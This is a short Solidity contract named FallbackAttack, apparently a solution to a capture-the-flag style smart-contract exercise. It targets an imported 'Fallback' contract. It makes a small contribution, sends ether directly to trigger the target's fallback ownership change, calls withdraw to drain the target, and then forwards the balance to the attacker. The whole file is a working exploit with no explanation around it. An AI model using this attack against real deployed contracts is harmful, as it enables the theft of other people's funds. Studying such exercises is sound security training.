pragma solidity 0.6.0;

import "./Fallback.sol";

contract FallbackAttack {

    Fallback _contract;
    address payable public owner;

    constructor(address payable _add) public {
        owner = msg.sender;
        _contract = Fallback(_add);
    }
    function contributeAttack() public {
        _contract.contribute.value(100000000000000)();
    }

    function sendAttack() public {
        address(_contract).transfer(100000000000000);
    }

    function withdrawAttack() public {
        _contract.withdraw();
    }
 
    function withdraw() public {
        owner.transfer(address(this).balance);
    }
    
    receive() external payable{ 
    }

}